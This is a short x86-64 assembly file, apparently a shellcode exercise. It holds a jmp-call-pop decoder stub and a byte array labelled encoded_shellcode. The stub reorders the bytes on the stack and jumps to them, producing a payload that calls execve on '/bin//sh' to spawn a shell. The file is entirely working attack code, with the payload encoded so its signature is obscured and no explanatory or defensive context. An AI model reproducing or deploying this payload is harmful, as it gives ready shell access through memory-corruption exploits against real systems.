global _start


_start:
	jmp find_address

decoder:
	pop rdi
	xor ecx, ecx
	add cl, 8 
decode:
	xor eax, eax
	push rax
	mov eax, [edi]
	mov dword [rsp+4],eax
	add rsp, 4 
	add dil, 4 
	loop decode
	jmp rsp

find_address:
	call decoder

encoded_shellcode: db 0xc0,0x3b,0x0f,0x05,0x89,0xe6,0x48,0x83,0x89,0xe2,0x57,0x48,0x89,0xe7,0x50,0x48,0x73,0x68,0x53,0x48,0x69,0x6e,0x2f,0x2f,0x48,0xbb,0x2f,0x62,0x48,0x31,0xc0,0x50 